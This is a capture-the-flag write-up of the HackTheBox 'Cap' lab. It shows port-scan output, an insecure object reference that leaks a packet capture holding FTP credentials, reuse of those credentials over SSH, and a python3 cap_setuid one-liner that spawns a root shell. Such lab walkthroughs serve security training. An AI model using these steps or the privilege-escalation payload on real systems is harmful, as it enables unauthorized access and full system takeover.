-----------------

### CTF: HACKTHEBOX
### Lab: Cap

------------------

![image](https://github.com/user-attachments/assets/5593dab3-4201-4a0f-832a-aacd61bc8b3d)

------------------

### RECONNAISSANCE

- Rustscan network scan output

      ❯ rustscan -a cap.htb -- -Pn -sC -sV
      .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
      | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
      | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
      `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
      The Modern Day Port Scanner.
      ________________________________________
      : https://discord.gg/GFrQsGy           :
      : https://github.com/RustScan/RustScan :
       --------------------------------------
      Real hackers hack time ⌛
      
      [~] The config file is expected to be at "/home/sensei/.rustscan.toml"
      [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
      [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
      Open 10.10.10.245:21
      Open 10.10.10.245:22
      Open 10.10.10.245:80
      [~] Starting Script(s)
      [>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")                                                                                           
                                                                                                                                                          
      Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.                                                      
      [~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-20 08:21 EDT                                                                              
      NSE: Loaded 156 scripts for scanning.                                                                                                               
      NSE: Script Pre-scanning.                                                                                                                           
      NSE: Starting runlevel 1 (of 3) scan.                                                                                                               
      Initiating NSE at 08:21                                                                                                                             
      Completed NSE at 08:21, 0.00s elapsed                                                                                                               
      NSE: Starting runlevel 2 (of 3) scan.                                                                                                               
      Initiating NSE at 08:21                                                                                                                             
      Completed NSE at 08:21, 0.00s elapsed                                                                                                               
      NSE: Starting runlevel 3 (of 3) scan.                                                                                                               
      Initiating NSE at 08:21                                                                                                                             
      Completed NSE at 08:21, 0.00s elapsed                                                                                                               
      Initiating Connect Scan at 08:21                                                                                                                    
      Scanning cap.htb (10.10.10.245) [3 ports]                                                                                                           
      Discovered open port 21/tcp on 10.10.10.245                                                                                                         
      Discovered open port 22/tcp on 10.10.10.245                                                                                                         
      Discovered open port 80/tcp on 10.10.10.245                                                                                                         
      Completed Connect Scan at 08:21, 0.31s elapsed (3 total ports)                                                                                      
      Initiating Service scan at 08:21
      Scanning 3 services on cap.htb (10.10.10.245)
      Completed Service scan at 08:23, 140.91s elapsed (3 services on 1 host)
      NSE: Script scanning 10.10.10.245.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 08:23
      NSE Timing: About 99.76% done; ETC: 08:24 (0:00:00 remaining)
      Completed NSE at 08:24, 33.77s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 08:24
      Completed NSE at 08:24, 5.01s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 08:24
      Completed NSE at 08:24, 0.02s elapsed
      Nmap scan report for cap.htb (10.10.10.245)
      Host is up, received user-set (0.31s latency).
      Scanned at 2024-09-20 08:21:30 EDT for 180s
      
      PORT   STATE SERVICE REASON  VERSION
      21/tcp open  ftp     syn-ack vsftpd 3.0.3
      22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
      | ssh-hostkey: 
      |   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
      | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2vrva1a+HtV5SnbxxtZSs+D8/EXPL2wiqOUG2ngq9zaPlF6cuLX3P2QYvGfh5bcAIVjIqNUmmc1eSHVxtbmNEQjyJdjZOP4i2IfX/RZUA18dWTfEWlNaoVDGBsc8zunvFk3nkyaynnXmlH7n3BLb1nRNyxtouW+q7VzhA6YK3ziOD6tXT7MMnDU7CfG1PfMqdU297OVP35BODg1gZawthjxMi5i5R1g3nyODudFoWaHu9GZ3D/dSQbMAxsly98L1Wr6YJ6M6xfqDurgOAl9i6TZ4zx93c/h1MO+mKH7EobPR/ZWrFGLeVFZbB6jYEflCty8W8Dwr7HOdF1gULr+Mj+BcykLlzPoEhD7YqjRBm8SHdicPP1huq+/3tN7Q/IOf68NNJDdeq6QuGKh1CKqloT/+QZzZcJRubxULUg8YLGsYUHd1umySv4cHHEXRl7vcZJst78eBqnYUtN3MweQr4ga1kQP4YZK5qUQCTPPmrKMa9NPh1sjHSdS8IwiH12V0=
      |   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
      | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDqG/RCH23t5Pr9sw6dCqvySMHEjxwCfMzBDypoNIMIa8iKYAe84s/X7vDbA9T/vtGDYzS+fw8I5MAGpX8deeKI=
      |   256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
      |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPbLTiQl+6W0EOi8vS+sByUiZdBsuz0v/7zITtSuaTFH
      80/tcp open  http    syn-ack gunicorn
      |_http-server-header: gunicorn
      | http-methods: 
      |_  Supported Methods: HEAD OPTIONS GET
      |_http-title: Security Dashboard
      | fingerprint-strings: 
      |   FourOhFourRequest: 
      |     HTTP/1.0 404 NOT FOUND
      |     Server: gunicorn
      |     Date: Fri, 20 Sep 2024 12:21:29 GMT
      |     Connection: close
      |     Content-Type: text/html; charset=utf-8
      |     Content-Length: 232
      |     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
      |     <title>404 Not Found</title>
      |     <h1>Not Found</h1>
      |     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
      |   GetRequest: 
      |     HTTP/1.0 200 OK
      |     Server: gunicorn
      |     Date: Fri, 20 Sep 2024 12:21:16 GMT
      |     Connection: close
      |     Content-Type: text/html; charset=utf-8
      |     Content-Length: 19386
      |     <!DOCTYPE html>
      |     <html class="no-js" lang="en">
      |     <head>
      |     <meta charset="utf-8">
      |     <meta http-equiv="x-ua-compatible" content="ie=edge">
      |     <title>Security Dashboard</title>
      |     <meta name="viewport" content="width=device-width, initial-scale=1">
      |     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
      |     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
      |     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
      |     <link rel="stylesheet" href="/static/css/themify-icons.css">
      |     <link rel="stylesheet" href="/static/css/metisMenu.css">
      |     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
      |     <link rel="stylesheet" href="/static/css/slicknav.min.css">
      |     <!-- amchar
      |   HTTPOptions: 
      |     HTTP/1.0 200 OK
      |     Server: gunicorn
      |     Date: Fri, 20 Sep 2024 12:21:18 GMT
      |     Connection: close
      |     Content-Type: text/html; charset=utf-8
      |     Allow: HEAD, OPTIONS, GET
      |     Content-Length: 0
      |   RTSPRequest: 
      |     HTTP/1.1 400 Bad Request
      |     Connection: close
      |     Content-Type: text/html
      |     Content-Length: 196
      |     <html>
      |     <head>
      |     <title>Bad Request</title>
      |     </head>
      |     <body>
      |     <h1><p>Bad Request</p></h1>
      |     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
      |     </body>
      |_    </html>
      1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
      SF-Port80-TCP:V=7.94SVN%I=7%D=9/20%Time=66ED68D2%P=x86_64-pc-linux-gnu%r(G
      SF:etRequest,2F4C,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\
      SF:x20Fri,\x2020\x20Sep\x202024\x2012:21:16\x20GMT\r\nConnection:\x20close
      SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20
      SF:19386\r\n\r\n<!DOCTYPE\x20html>\n<html\x20class=\"no-js\"\x20lang=\"en\
      SF:">\n\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20
      SF:\x20<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x
      SF:20\x20\x20\x20<title>Security\x20Dashboard</title>\n\x20\x20\x20\x20<me
      SF:ta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-sca
      SF:le=1\">\n\x20\x20\x20\x20<link\x20rel=\"shortcut\x20icon\"\x20type=\"im
      SF:age/png\"\x20href=\"/static/images/icon/favicon\.ico\">\n\x20\x20\x20\x
      SF:20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/bootstrap\.min\.css
      SF:\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/
      SF:font-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\
      SF:x20href=\"/static/css/themify-icons\.css\">\n\x20\x20\x20\x20<link\x20r
      SF:el=\"stylesheet\"\x20href=\"/static/css/metisMenu\.css\">\n\x20\x20\x20
      SF:\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/owl\.carousel\.mi
      SF:n\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/stati
      SF:c/css/slicknav\.min\.css\">\n\x20\x20\x20\x20<!--\x20amchar")%r(HTTPOpt
      SF:ions,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Fri,
      SF:\x2020\x20Sep\x202024\x2012:21:18\x20GMT\r\nConnection:\x20close\r\nCon
      SF:tent-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20HEAD,\x20OPTIONS
      SF:,\x20GET\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,121,"HTTP/1\.1
      SF:\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20t
      SF:ext/html\r\nContent-Length:\x20196\r\n\r\n<html>\n\x20\x20<head>\n\x20\
      SF:x20\x20\x20<title>Bad\x20Request</title>\n\x20\x20</head>\n\x20\x20<bod
      SF:y>\n\x20\x20\x20\x20<h1><p>Bad\x20Request</p></h1>\n\x20\x20\x20\x20Inv
      SF:alid\x20HTTP\x20Version\x20&#x27;Invalid\x20HTTP\x20Version:\x20&#x27;R
      SF:TSP/1\.0&#x27;&#x27;\n\x20\x20</body>\n</html>\n")%r(FourOhFourRequest,
      SF:189,"HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x
      SF:20Fri,\x2020\x20Sep\x202024\x2012:21:29\x20GMT\r\nConnection:\x20close\
      SF:r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x202
      SF:32\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\
      SF:x20Final//EN\">\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</
      SF:h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20
      SF:server\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x2
      SF:0check\x20your\x20spelling\x20and\x20try\x20again\.</p>\n");
      Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


- FFUF's output

![image](https://github.com/user-attachments/assets/0377c842-7d36-427f-a979-28402152ff6e)

- Route `capture` redirects to another route `/data/1` that allows us download a pcap file

![image](https://github.com/user-attachments/assets/c475fa44-a693-4e05-9948-1e3dc33b06d4)

- I spotted a user `Nathan`.

![image](https://github.com/user-attachments/assets/4eeae23c-76ce-4f89-80df-b1423f7229bc)

- I decided to check the route `/data/` and change the `id` to 0 and got a pcap file.

![image](https://github.com/user-attachments/assets/cfd5853b-19c2-455a-85c7-8ba9994175f9)

- After checking the pcap file, I discovered a password for the ftp service.

![image](https://github.com/user-attachments/assets/ce45015f-73a3-4abc-8418-08b5eef416a8)

- The password also works for ssh.Now we have ssh to access to Nathan's user account.

![image](https://github.com/user-attachments/assets/f62ac18b-0197-4353-a24e-e31c6a4bf400)

----------------------

### PRIVESC with capabilities

- I ran `getcap -r / 2</dev/null` to check for binaries with capabilities.I discovered that python3 has the capability to set uid.

![image](https://github.com/user-attachments/assets/c0e86496-8479-4bd0-9f12-6412078371ce)

- I escalated privileges by setting Nathan's account to uid `0`.

Payload-:```python3 -c "import os;os.setuid(0);os.system('bash -p')"```

![image](https://github.com/user-attachments/assets/b122e0e3-f524-493e-952c-f0eb6092e0a0)

- Root...!!!

![image](https://github.com/user-attachments/assets/e4ed57ef-71ac-4564-b2de-b2f2980837f4)

-------------------

### THANKS FOR READING !!!!!

-------------------









